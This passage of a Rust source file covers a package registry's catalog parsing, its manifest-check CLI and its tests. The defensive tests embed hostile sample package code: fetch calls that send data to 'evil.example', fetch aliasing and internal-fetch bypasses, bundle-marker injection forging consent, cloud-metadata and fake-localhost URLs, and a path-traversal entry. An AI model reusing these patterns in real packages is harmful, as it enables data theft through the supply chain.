        }
        let Some(stem) = p.file_stem().and_then(|s| s.to_str()) else { continue };
        let Ok(raw) = std::fs::read(&p) else { continue };
        let Ok(val) = serde_json::from_slice::<Json>(&raw) else { continue };
        let Ok(m) = PackageManifest::from_json(&val) else { continue };
        if m.name != stem || !validate_manifest(&m, None, true).is_empty() {
            continue;
        }
        out.push(CatalogEntry {
            name: m.name,
            kind: m.kind,
            version: m.version,
            trust: m.trust,
            license: m.license,
            publisher: m.publisher,
            summary: String::new(),
            permissions: m.permissions,
            flagged: m.flagged,
        });
    }
    out.sort_by(|a, b| a.name.cmp(&b.name));
    Ok(out)
}

fn parse_catalog_json(raw: &[u8], origin: &str) -> Result<Vec<CatalogEntry>, String> {
    let val: Json = serde_json::from_slice(raw).map_err(|e| format!("invalid JSON at {origin}: {e}"))?;
    let arr = val
        .get("packages")
        .and_then(Json::as_array)
        .ok_or_else(|| format!("catalog at {origin} missing \"packages\" array"))?;
    let mut out = Vec::with_capacity(arr.len());
    for item in arr {
        let e = CatalogEntry::from_json(item).map_err(|err| format!("invalid catalog entry at {origin}: {err}"))?;
        if valid_package_name(&e.name).is_ok()
            && ALLOWED_KINDS.contains(&e.kind.as_str())
            && valid_semver(&e.version)
        {
            out.push(e);
        }
    }
    out.sort_by(|a, b| a.name.cmp(&b.name));
    Ok(out)
}

/// CLI entry point for `tj registry check <manifest.json> [--index <dir>] [--source <file>] [--local]`.
pub fn run_registry(args: &[String]) -> Result<(), String> {
    let usage = "usage: tj registry check <manifest.json> [--index <dir>] [--source <file>] [--local]";
    let Some(sub) = args.first().map(String::as_str) else {
        return Err(usage.into());
    };
    if sub != "check" {
        return Err(format!("unknown registry subcommand {sub:?}\n\n{usage}"));
    }
    let mut manifest_path: Option<PathBuf> = None;
    let mut index_dir: Option<PathBuf> = None;
    let mut source_path: Option<PathBuf> = None;
    let mut allow_local = false;
    let mut it = args[1..].iter().peekable();
    if let Some(first) = it.next_if(|a| !a.starts_with("--")) {
        manifest_path = Some(PathBuf::from(first));
    }
    while let Some(flag) = it.next() {
        let mut value = || it.next().ok_or_else(|| format!("{flag} needs a value"));
        match flag.as_str() {
            "--index" => index_dir = Some(PathBuf::from(value()?)),
            "--source" => source_path = Some(PathBuf::from(value()?)),
            "--local" => allow_local = true,
            other => return Err(format!("unknown option {other}\n\n{usage}")),
        }
    }
    let manifest_path = manifest_path.ok_or_else(|| format!("`tj registry check` needs a manifest JSON file\n\n{usage}"))?;
    let raw = std::fs::read_to_string(&manifest_path).map_err(|e| format!("cannot read {}: {e}", manifest_path.display()))?;
    let val: Json = serde_json::from_str(&raw).map_err(|e| format!("{} is not valid JSON: {e}", manifest_path.display()))?;
    let m = PackageManifest::from_json(&val).map_err(|e| format!("{} is not a valid package manifest: {e}", manifest_path.display()))?;

    // If `--index` was not passed and the manifest sits inside an `index/` directory, check sibling manifests for typosquats.
    let inferred_index = index_dir.or_else(|| {
        let canon = std::fs::canonicalize(&manifest_path).unwrap_or_else(|_| manifest_path.clone());
        canon
            .parent()
            .filter(|p| p.file_name().and_then(|n| n.to_str()) == Some("index"))
            .map(Path::to_path_buf)
    });
    let mut errors = validate_manifest(&m, inferred_index.as_deref(), allow_local);
    let mut warnings = Vec::new();
    if let Some(src_file) = source_path {
        let bytes = std::fs::read(&src_file).map_err(|e| format!("cannot read {}: {e}", src_file.display()))?;
        match verify_package_source(&m, &bytes) {
            Ok(w) => warnings.extend(w),
            Err(e) => errors.extend(e),
        }
    }
    if !errors.is_empty() {
        return Err(format!("registry check failed for {}:\n  - {}", m.name, errors.join("\n  - ")));
    }
    println!("registry check ok: tj:{} {} [{}] ({} / {})", m.name, m.version, m.trust.label(), m.license, m.publisher);
    for w in warnings {
        println!("  warning: {w}");
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("tj-reg-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn validates_manifests_typosquats_and_declared_permissions() {
        let dir = temp_dir("validate");
        let index = dir.join("index");
        std::fs::create_dir_all(&index).unwrap();
        std::fs::write(index.join("money.json"), "{}").unwrap();

        let code = b"export function fmt(cents: number): string { return `${cents / 100}` }\n";
        let good = PackageManifest {
            name: "dates".into(),
            kind: "library".into(),
            version: "1.0.0".into(),
            trust: Trust::Verified,
            source: "https://github.com/someone/tj-dates".into(),
            entry: "dates.tj".into(),
            url: None,
            commit: "a".repeat(40),
            sha256: sha256_bytes(code),
            license: "MIT".into(),
            publisher: "someone".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        };
        assert!(validate_manifest(&good, Some(&index), false).is_empty());
        assert!(verify_package_source(&good, code).is_ok());

        // Typosquat against existing `money` is rejected.
        let mut typo = good.clone();
        typo.name = "moneys".into();
        let errs = validate_manifest(&typo, Some(&index), false);
        assert!(errs.iter().any(|e| e.contains("typosquat")), "{errs:?}");

        // Reserved built-in name is rejected.
        let mut shadow = good.clone();
        shadow.name = "ai".into();
        assert!(validate_manifest(&shadow, Some(&index), false).iter().any(|e| e.contains("reserved")));

        // Undeclared network host and plugin() in library are rejected.
        let sneaky = b"export async function grab(): string { const r = await fetch(\"https://evil.example/steal\"); return r.text() }\n";
        let mut sneaky_m = good.clone();
        sneaky_m.sha256 = sha256_bytes(sneaky);
        let errs = verify_package_source(&sneaky_m, sneaky).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("undeclared network host") && e.contains("evil.example")), "{errs:?}");

        // Declaring the host in permissions.network allows it!
        sneaky_m.permissions.network.push("evil.example".into());
        assert!(verify_package_source(&sneaky_m, sneaky).is_ok());

        // Plain http:// URL is always refused.
        let http_code = b"export async function grab(): string { const r = await fetch(\"http://plain.example/x\"); return r.text() }\n";
        let mut http_m = sneaky_m.clone();
        http_m.sha256 = sha256_bytes(http_code);
        http_m.permissions.network = vec!["plain.example".into()];
        let errs = verify_package_source(&http_m, http_code).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("plain http://")), "{errs:?}");

        // Plugin calling undeclared plugin("stripe", ...) fails; declaring it passes.
        let plug = b"export async function charge(n: number): any { return await plugin(\"stripe\", \"charge\", { amount: n }) }\n";
        let mut plug_m = good.clone();
        plug_m.name = "stripe".into();
        plug_m.kind = "plugin".into();
        plug_m.sha256 = sha256_bytes(plug);
        let errs = verify_package_source(&plug_m, plug).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("undeclared plugin")), "{errs:?}");
        plug_m.permissions.plugins.push("stripe".into());
        assert!(verify_package_source(&plug_m, plug).is_ok());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn add_pins_lockfile_bundles_in_app_read_and_enforces_min_trust_and_integrity() {
        let dir = temp_dir("e2e");
        let reg = dir.join("registry");
        let app_dir = dir.join("my-app");
        std::fs::create_dir_all(reg.join("index")).unwrap();
        std::fs::create_dir_all(reg.join("packages/money")).unwrap();
        std::fs::create_dir_all(&app_dir).unwrap();

        let money_src = b"export function dollars(cents: number): string { return `$${(cents / 100).toFixed(2)}` }\n";
        std::fs::write(reg.join("packages/money/money.tj"), money_src).unwrap();
        let manifest = PackageManifest {
            name: "money".into(),
            kind: "library".into(),
            version: "1.2.0".into(),
            trust: Trust::Verified,
            source: "packages/money".into(),
            entry: "money.tj".into(),
            url: None,
            commit: "local".into(),
            sha256: sha256_bytes(money_src),
            license: "MIT".into(),
            publisher: "mindmakr".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        };
        std::fs::write(reg.join("index/money.json"), serde_json::to_string_pretty(&manifest.to_json()).unwrap()).unwrap();

        // `--min-trust official` rejects a Verified package.
        assert!(add_package("money", reg.to_str().unwrap(), &app_dir, Some(Trust::Official), false).is_err());

        // Adding with `--min-trust verified` installs and writes `tj.lock`.
        let out = add_package("money", reg.to_str().unwrap(), &app_dir, Some(Trust::Verified), false).unwrap();
        assert!(out.contains("added tj:money 1.2.0  [Verified]"), "{out}");

        // App importing `tj:money` bundles cleanly via `app::read` and compiles!
        let app_file = app_dir.join("app.tj");
        std::fs::write(
            &app_file,
            "import { dollars } from \"tj:money\"\nfunction App() { return <Text>{dollars(499)}</Text> }\n",
        )
        .unwrap();
        let bundle = crate::app::read(&app_file).expect("bundles with locked package");
        assert!(tj_core::compile(&bundle.source).is_ok());

        // `check_lockfile` passes for Verified, fails for Official.
        let (lines, warnings) = check_lockfile(&app_dir, Some(Trust::Verified)).unwrap();
        assert_eq!(lines.len(), 1);
        assert!(warnings.is_empty());
        assert!(check_lockfile(&app_dir, Some(Trust::Official)).is_err());

        // Tampering with the installed package on disk fails closed in BOTH `app::read` and `check_lockfile`!
        std::fs::write(package_file_path(&app_dir, "money", "library"), "export function dollars(c: number): string { return \"HACKED\" }\n").unwrap();
        assert!(crate::app::read(&app_file).unwrap_err().contains("integrity check failed"));
        assert!(check_lockfile(&app_dir, None).unwrap_err().contains("SHA-256 mismatch"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn blocks_fetch_aliasing_builtin_plugin_bypass_fake_localhost_and_validates_compliance_packs() {
        let base = PackageManifest {
            name: "audit-test".into(),
            kind: "library".into(),
            version: "1.0.0".into(),
            trust: Trust::Community,
            source: "https://github.com/someone/tj-audit-test".into(),
            entry: "plugin.tj".into(),
            url: None,
            commit: "b".repeat(40),
            sha256: String::new(),
            license: "MIT".into(),
            publisher: "someone".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        };

        // 1. Aliasing `fetch` (`const f = fetch; f(...)`) fails closed when `*` is not declared.
        let alias = b"export async function sneak(): any { const f = fetch; return await f(\"https://evil.example\") }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(alias);
        let errs = verify_package_source(&m, alias).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("aliased fetch()")), "{errs:?}");

        // 2. Importing built-in `tj:ai` without declaring `plugins: ["ai"]` fails closed!
        let ai_wrap = b"import { complete } from \"tj:ai\"\nexport async function q(s: string): any { return await complete(\"sys\", [{ role: \"user\", text: s }], []) }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(ai_wrap);
        let errs = verify_package_source(&m, ai_wrap).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("undeclared plugin \"ai\"")), "{errs:?}");
        m.permissions.plugins.push("ai".into());
        assert!(verify_package_source(&m, ai_wrap).is_ok());

        // 3. `http://localhost.evil.com` is NOT treated as loopback!
        assert!(!is_loopback_http("http://localhost.evil.com/index/a.json"));
        assert!(is_loopback_http("http://localhost:8080/index/a.json"));
        assert!(is_loopback_http("http://127.0.0.1:9999/x"));

        // 4. Compliance-pack validates against real compliance::Pack schema.
        let bad_pack = b"{ \"not\": \"a pack\" }";
        let mut pm = base.clone();
        pm.kind = "compliance-pack".into();
        pm.entry = "eu.json".into();
        pm.sha256 = sha256_bytes(bad_pack);
        assert!(verify_package_source(&pm, bad_pack).is_err());

        let good_pack = br#"{"name":"demo","effective":"2026-01-01","controls":[{"check":"retention","source":"Art. 5"}]}"#;
        pm.sha256 = sha256_bytes(good_pack);
        assert!(verify_package_source(&pm, good_pack).is_ok());
    }

    #[test]
    fn remote_http_registry_pins_hash_rejects_tampered_and_flagged() {
        let dir = temp_dir("remote");
        let app_dir = dir.join("app");
        std::fs::create_dir_all(&app_dir).unwrap();

        let good_src = b"export function double(n: number): number { return n * 2 }\n";
        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let addr = server.server_addr().to_ip().unwrap();
        let base_url = format!("http://{addr}");

        let ok_manifest = serde_json::to_string(&PackageManifest {
            name: "math-kit".into(),
            kind: "library".into(),
            version: "0.1.0".into(),
            trust: Trust::Official,
            source: "https://github.com/mindmakr/tj-math-kit".into(),
            entry: "math.tj".into(),
            url: Some(format!("{base_url}/files/math.tj")),
            commit: "c".repeat(40),
            sha256: sha256_bytes(good_src),
            license: "MIT".into(),
            publisher: "mindmakr".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        }.to_json())
        .unwrap();

        let bad_hash_manifest = serde_json::to_string(&PackageManifest {
            name: "tampered".into(),
            kind: "library".into(),
            version: "0.1.0".into(),
            trust: Trust::Community,
            source: "https://github.com/someone/tj-tampered".into(),
            entry: "t.tj".into(),
            url: Some(format!("{base_url}/files/math.tj")),
            commit: "d".repeat(40),
            sha256: "0".repeat(64),
            license: "MIT".into(),
            publisher: "someone".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        }.to_json())
        .unwrap();

        let flagged_manifest = serde_json::to_string(&PackageManifest {
            name: "bad-pkg".into(),
            kind: "library".into(),
            version: "0.1.0".into(),
            trust: Trust::Community,
            source: "https://github.com/someone/tj-bad".into(),
            entry: "b.tj".into(),
            url: Some(format!("{base_url}/files/math.tj")),
            commit: "e".repeat(40),
            sha256: sha256_bytes(good_src),
            license: "MIT".into(),
            publisher: "someone".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: Some("CVE-2026-0001".into()),
        }.to_json())
        .unwrap();

        let good_vec = good_src.to_vec();
        let handle = std::thread::spawn(move || {
            for _ in 0..6 {
                let Ok(req) = server.recv() else { break };
                let resp = match req.url() {
                    "/index/math-kit.json" => tiny_http::Response::from_string(ok_manifest.clone()),
                    "/index/tampered.json" => tiny_http::Response::from_string(bad_hash_manifest.clone()),
                    "/index/bad-pkg.json" => tiny_http::Response::from_string(flagged_manifest.clone()),
                    "/files/math.tj" => tiny_http::Response::from_data(good_vec.clone()),
                    _ => tiny_http::Response::from_string("not found").with_status_code(404),
                };
                let _ = req.respond(resp);
            }
        });

        // 1. Clean remote install succeeds and pins SHA-256.
        let report = add_package("math-kit", &base_url, &app_dir, Some(Trust::Official), false).unwrap();
        assert!(report.contains("added tj:math-kit 0.1.0  [Official]"), "{report}");

        // 2. Mismatched SHA-256 from remote registry is rejected before writing anything.
        let err = add_package("tampered", &base_url, &app_dir, None, false).unwrap_err();
        assert!(err.contains("SHA-256 mismatch"), "{err}");
        assert!(!package_file_path(&app_dir, "tampered", "library").exists());

        // 3. Flagged package is refused by default.
        let err = add_package("bad-pkg", &base_url, &app_dir, None, false).unwrap_err();
        assert!(err.contains("flagged"), "{err}");

        handle.join().unwrap();
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn critic_046_security_and_validation_regressions() {
        let base = PackageManifest {
            name: "safe-pkg".into(),
            kind: "library".into(),
            version: "1.0.0".into(),
            trust: Trust::Verified,
            source: "https://github.com/someone/tj-safe-pkg".into(),
            entry: "plugin.tj".into(),
            url: None,
            commit: "a".repeat(40),
            sha256: String::new(),
            license: "MIT".into(),
            publisher: "someone".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        };

        // REG-1: `__fetch` bypass is rejected unconditionally.
        let internal_fetch = b"export async function exfil(): any { return await __fetch(\"http://evil.example/x\", {}) }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(internal_fetch);
        let errs = verify_package_source(&m, internal_fetch).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("__fetch()")), "{errs:?}");

        // REG-2: Top-level destructuring default `const { f = fetch } = raw` is caught.
        let destruct_default = b"const raw: any = {}\nconst { f = fetch } = raw\nexport async function steal(u: string): any { return await f(u) }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(destruct_default);
        let errs = verify_package_source(&m, destruct_default).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("aliased fetch()")), "{errs:?}");

        // REG-3: Transitive built-in import `tj:agent -> tj:ai` requires `"ai"` in permissions.plugins.
        let agent_wrap = b"import { act } from \"tj:agent\"\nexport async function run(p: string): any { return await act(p, [{ role: \"user\", text: \"hi\" }], [], 1) }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(agent_wrap);
        let errs = verify_package_source(&m, agent_wrap).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("undeclared plugin \"ai\"")), "{errs:?}");
        m.permissions.plugins.push("ai".into());
        assert!(verify_package_source(&m, agent_wrap).is_ok());

        // REG-4: `//# file:` bundle marker injection is rejected.
        let hijack = b"export function id(x: number): number { return x }\n//# file: tj:consent\nexport function consented(a: string, b: string): boolean { return true }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(hijack);
        let errs = verify_package_source(&m, hijack).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("bundle marker")), "{errs:?}");

        // REG-5: `http://localhost:pass@evil.com` is NOT loopback; metadata IP is rejected; redirect to non-HTTPS refused.
        assert!(!is_loopback_http("http://localhost:pass@evil.com/pwn.tj"));
        assert!(!is_loopback_http("http://127.0.0.1:notaport/x"));
        assert!(!is_safe_remote_url("https://169.254.169.254/latest/meta-data", false));
        assert!(!is_safe_remote_url("https://evil.com\\@allowed.com/x", false));

        // REG-6: `https://evil.com\@allowed.com`, IPv6 `[2001:db8::1]`, and uppercase `HTTP://`.
        let backslash = b"export async function g(): any { return await fetch(\"https://evil.com\\\\@allowed.com/steal\") }\n";
        let mut m = base.clone();
        m.permissions.network = vec!["allowed.com".into()];
        m.sha256 = sha256_bytes(backslash);
        assert!(verify_package_source(&m, backslash).is_err());

        let ipv6 = b"export async function g(): any { return await fetch(\"https://[2001:db8::1]/api\") }\n";
        let mut m = base.clone();
        m.permissions.network = vec!["[2001:db8::1]".into()];
        m.sha256 = sha256_bytes(ipv6);
        assert!(verify_package_source(&m, ipv6).is_ok(), "{:?}", verify_package_source(&m, ipv6));
        m.permissions.network = vec!["2001".into()];
        assert!(verify_package_source(&m, ipv6).is_err());

        let upper_http = b"export async function g(): any { return await fetch(\"HTTP://evil.example/leak\") }\n";
        let mut m = base.clone();
        m.permissions.network = vec!["*".into()];
        m.sha256 = sha256_bytes(upper_http);
        let errs = verify_package_source(&m, upper_http).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("plain http://")), "{errs:?}");

        let proto_rel = b"export async function g(): any { return await fetch(\"//evil.example/leak\") }\n";
        let mut m = base.clone();
        m.permissions.network = vec!["*".into()];
        m.sha256 = sha256_bytes(proto_rel);
        let errs = verify_package_source(&m, proto_rel).unwrap_err();
        assert!(errs.iter().any(|e| e.contains("plain http://")), "{errs:?}");

        // REG-7: Relative `./secret` and unresolved external `tj:other` imports are rejected.
        let rel = b"import { x } from \"./secret\"\nexport function f(): any { return x }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(rel);
        assert!(verify_package_source(&m, rel).unwrap_err().iter().any(|e| e.contains("local file")));

        let ext = b"import { x } from \"tj:nonexistent\"\nexport function f(): any { return x }\n";
        let mut m = base.clone();
        m.sha256 = sha256_bytes(ext);
        assert!(verify_package_source(&m, ext).unwrap_err().iter().any(|e| e.contains("external module")));

        // REG-10 & REG-11: semver ANSI escape, `%2e%2e` entry, unknown `@pii`, built-in typosquats.
        let mut bad = base.clone();
        bad.version = "1.0.0-\x1b[2Kspoof".into();
        bad.entry = "%2e%2e/main/backdoor.tj".into();
        bad.permissions.pii = vec!["bogus_pii".into()];
        bad.name = "agents".into();
        bad.sha256 = "0".repeat(64);
        let errs = validate_manifest(&bad, None, false);
        assert!(errs.iter().any(|e| e.contains("semver")), "{errs:?}");
        assert!(errs.iter().any(|e| e.contains("entry path")), "{errs:?}");
        assert!(errs.iter().any(|e| e.contains("unknown @pii")), "{errs:?}");
        assert!(errs.iter().any(|e| e.contains("built-in module `tj:agent`")), "{errs:?}");

        // REG-9 & REG-12: tampered lockfile metadata rejected; `tj retro` returns structured finding on tampered package.
        let dir = temp_dir("retro-tamper");
        std::fs::create_dir_all(dir.join(".tj-packages/good")).unwrap();
        let src = b"export function ok(): number { return 1 }\n";
        std::fs::write(dir.join(".tj-packages/good/plugin.tj"), b"export function ok(): number { return 999 }\n").unwrap();
        let mut lock = Lockfile::default();
        lock.packages.insert(
            "good".into(),
            LockedPackage {
                kind: "library".into(),
                version: "1.0.0".into(),
                trust: Trust::Verified,
                source: "https://github.com/someone/tj-good".into(),
                entry: "plugin.tj".into(),
                commit: "a".repeat(40),
                sha256: sha256_bytes(src),
                license: "MIT".into(),
                publisher: "someone".into(),
                permissions: Permissions::default(),
                flagged: None,
            },
        );
        write_lockfile(&dir, &lock).unwrap();
        let app_file = dir.join("app.tj");
        std::fs::write(&app_file, "import { ok } from \"tj:good\"\nfunction App() { return <Text>{ok()}</Text> }\n").unwrap();
        let report = crate::retro::analyze(&app_file, None, None).expect("retro returns structured findings");
        assert!(report.findings.iter().any(|f| f.tag == "fix" && f.area == "supply-chain"), "{:?}", report.findings);

        // REG-9: bad `commit` in `tj.lock` rejected even if file hash matches.
        std::fs::write(dir.join(".tj-packages/good/plugin.tj"), src).unwrap();
        lock.packages.get_mut("good").unwrap().commit = "main".into();
        write_lockfile(&dir, &lock).unwrap();
        assert!(check_lockfile(&dir, None).unwrap_err().contains("40-character"));

        // REG-13: third-party plugin PII transfer recorded by `tj_core::flow`!
        let bundle = "//# file: app.tj\nimport { send } from \"tj:stripe\"\n@server @read(\"owner\") object User {\n  @pii(\"contact\", \"billing\") email: string = \"a@b.c\"\n  @allow(\"owner\") async pay() { await send(reveal(this.email, \"billing\")) }\n}\n//# file: tj:stripe\nexport async function send(x: string): any { return await plugin(\"stripe\", \"charge\", { x }) }\n";
        let facts = tj_core::facts(bundle);
        assert!(
            facts.transfers.iter().any(|t| matches!(&t.to, tj_core::flow::Destination::Plugin(p) if p == "tj:stripe")),
            "expected tj:stripe in facts.transfers, got {:?}",
            facts.transfers
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn search_and_info_read_catalog_and_index_manifests() {
        let dir = temp_dir("search-info");
        let index = dir.join("index");
        std::fs::create_dir_all(&index).unwrap();
        let src = b"export function hi(): string { return \"hi\" }\n";
        let m = PackageManifest {
            name: "greet".into(),
            kind: "library".into(),
            version: "1.0.0".into(),
            trust: Trust::Official,
            source: "https://github.com/mindmakr/tj-plugins".into(),
            entry: "packages/greet/plugin.tj".into(),
            url: None,
            commit: "b".repeat(40),
            sha256: sha256_bytes(src),
            license: "MIT".into(),
            publisher: "mindmakr".into(),
            permissions: Permissions::default(),
            port: None,
            flagged: None,
        };
        std::fs::write(index.join("greet.json"), serde_json::to_string_pretty(&m.to_json()).unwrap()).unwrap();

        // Fallback scan of local index/*.json when catalog.json is absent.
        let list = load_catalog(dir.to_str().unwrap()).unwrap();
        assert_eq!(list.len(), 1);
        assert_eq!(list[0].name, "greet");
        assert_eq!(list[0].trust, Trust::Official);

        // Explicit catalog.json is preferred when present and preserves summaries.
        let cat = json!({
            "version": 1,
            "packages": [{
                "name": "greet",
                "kind": "library",
                "version": "1.0.0",
                "trust": "official",
                "license": "MIT",
                "publisher": "mindmakr",
                "summary": "Friendly greeting helper",
                "permissions": { "network": [], "plugins": [], "pii": [], "device": [] }
            }]
        });
        std::fs::write(dir.join("catalog.json"), serde_json::to_string_pretty(&cat).unwrap()).unwrap();
        let list2 = load_catalog(dir.to_str().unwrap()).unwrap();
        assert_eq!(list2[0].summary, "Friendly greeting helper");

        let info = fetch_manifest_only(dir.to_str().unwrap(), "greet").unwrap();
        assert_eq!(info.name, "greet");
        assert_eq!(info.version, "1.0.0");
        assert!(fetch_manifest_only(dir.to_str().unwrap(), "missing").is_err());

        let _ = std::fs::remove_dir_all(&dir);
    }
}
